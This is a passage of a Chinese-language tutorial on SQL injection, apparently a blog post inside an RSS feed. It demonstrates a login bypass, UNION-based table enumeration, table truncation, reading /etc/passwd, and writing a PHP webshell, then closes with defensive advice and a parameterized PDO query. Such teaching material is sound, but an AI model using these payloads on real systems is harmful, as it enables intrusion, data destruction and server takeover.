&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM Customer WHERE name = &#39;admin&#39; AND pass = &#39;&#39; OR &#39;&#39; = &#39;&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这个SQL语句中的&amp;rdquo; = &amp;ldquo;将这个WHERE条件变成了恒等于TRUE，所以会返回所有记录。如果程序通过判断返回的记录数是否大于0来判断验证是否通过的话，这样我们就绕过了程序的验证。&lt;/p&gt;

&lt;h3 id=&#34;4-2-暴库&#34;&gt;4.2 暴库&lt;/h3&gt;

&lt;p&gt;根据上面的例子可以看到原本是想查询用户名为admin的用户记录，SQL注入后返回的却是数据库中的所有记录。通过这种方式连接其他的表，利用一点点的手段，就几乎可以获取所有数据库、所有表、所有字段的信息，并可以根据这些信息进一步查询数据库中的任意数据。这就是所谓的暴库。譬如还是上面的SQL例子，通过下面的SQL可以获取MySQL版本：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM User WHERE name = &#39;Zhangsan&#39; AND MID(VERSION(),1,1) = &#39;5&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;通过下面的SQL可以爆出所有表：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM User WHERE name = &#39;Zhangsan&#39; UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM information_schema.TABLES WHERE TABLE_TYPE = &#39;BASE TABLE&#39;-- -&#39;

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;这种方法称为Union法。要让这个SQL能够正确执行，User表的字段必须和后面UNION SELECT的字段个数一致，如果字段个数不一致SQL执行会报错。所以要让这种方法生效首先得确定User表字段个数，一般通过ORDER BY试探法，如下所示，通过递增ORDER BY的数值直到页面出错来确定字段个数。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM User WHERE name = &#39;Zhangsan&#39; ORDER BY 1 -- -&#39;  -- 正常
  SELECT * FROM User WHERE name = &#39;Zhangsan&#39; ORDER BY 2 -- -&#39;  -- 正常
  SELECT * FROM User WHERE name = &#39;Zhangsan&#39; ORDER BY 3 -- -&#39;  -- 正常
  SELECT * FROM User WHERE name = &#39;Zhangsan&#39; ORDER BY 4 -- -&#39;  -- 正常
  SELECT * FROM User WHERE name = &#39;Zhangsan&#39; ORDER BY 5 -- -&#39;  -- 页面出错，可推测User表字段数为4
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;确定好User表的字段个数后，后面的UNION SELECT语句也需要做相应的调整，可以用数字1来填充，如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM User WHERE name = &#39;Zhangsan&#39; UNION SELECT TABLE_SCHEMA, TABLE_NAME, 1, 1 FROM information_schema.TABLES WHERE TABLE_TYPE = &#39;BASE TABLE&#39;-- -&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;4-3-增删改查-任意数据库操作&#34;&gt;4.3 增删改查，任意数据库操作&lt;/h3&gt;

&lt;p&gt;一旦知道了所有的数据库信息，则可以修改注入语句任意操作数据库。如下的例子将Product表清空：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM User WHERE uid = 123; TRUNCATE TABLE Product
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;4-4-读写文件&#34;&gt;4.4 读写文件&lt;/h3&gt;

&lt;p&gt;MySQL提供了两个方法可以从本地读取和写入文件，如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT LOAD_FILE(&#39;/etc/passwd&#39;);
  SELECT &#39;&amp;lt;? system($_GET[\&#39;c\&#39;]); ?&amp;gt;&#39; INTO OUTFILE &#39;/var/www/shell.php&#39;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;上面两个例子展现了SQL注入的强大威力，如果MySQL用户拥有读写文件的权限，那么SQL注入将对站点带来巨大的威胁。第一个例子可以爆出linux服务器上的账号密码文件，第二个例子是向网站根目录写一个webshell，通过这个webshell用户就可以执行linux的系统命令了。譬如：&lt;a href=&#34;http://www.example.com/shell.php?c=ls，通过webshell攻击者可以进一步做更多的事情了，最后直到控制整个服务器。&#34;&gt;http://www.example.com/shell.php?c=ls，通过webshell攻击者可以进一步做更多的事情了，最后直到控制整个服务器。&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&#34;5-防范sql注入&#34;&gt;5.防范SQL注入&lt;/h2&gt;

&lt;p&gt;针对SQL注入的特点，总结以下几点基本的防范原则：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;永远不要相信用户输入，对用户输入进行校验&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;永远不要自己拼接SQL&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;永远不要用管理员权限的数据库连接&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;永远不要明文保存机密信息&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;尽量不要显示程序的异常信息，保存到表或日志文件中&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;使用WAF（绕过WAF又是另一个话题了）&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;从编程的角度来看可以做如下的事情：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;用户输入验证：类型转换、正则表达式、特殊符号过滤（引号，分号，注释符号等）&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;使用参数化存储过程&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;使用参数化SQL语句&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;采用ORM框架&lt;/strong&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;其中将拼接的SQL语句改为使用参数化的SQL语句是最常用的防范方法，另外，参数化的SQL不仅比拼接的更安全，而且性能要更高。 SQL语句的执行过程分几个步骤：语法检查、分析、执行、返回结果。当一条SQL通过语法检查后，会在共享池里寻找是否有跟其相同的语句，如果有则用已有的执行计划执行语句，如果没有找到，则生成执行计划，然后才执行语句。 自己拼接的SQL语句会随着变量的不同而不同，如下面的两句SQL，执行每个SQL的时候都会生成一次执行计划，而这些执行计划其实都是一样的。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;  SELECT * FROM Customer WHERE uid = 1
  SELECT * FROM Customer WHERE uid = 2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当这种SQL语句被大量调用时，会导致共享池中的SQL语句增多，而重用性极低，导致共享池内命中率下降。维护共享池内部结构消耗了大量的CPU和内存资源，而并没有充分利用执行计划的缓存优势，这样会带来性能问题。采用参数绑定的方式，可以解决这个问题：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  $uid = 1;
  $pdo = new PDO(...);
  $sql = &amp;quot;SELECT * FROM Customer WHERE uid = :ID&amp;quot;;
  $stmt = $pdo-&amp;gt;prepare($sql);
  $stmt-&amp;gt;bindValue(&amp;quot;:ID&amp;quot;, $uid, PDO::PARAM_INT);
  $result = $stmt-&amp;gt;execute();
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;6-参考&#34;&gt;6.参考&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://websec.ca/kb/sql_injection&#34;&gt;sql_injection&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>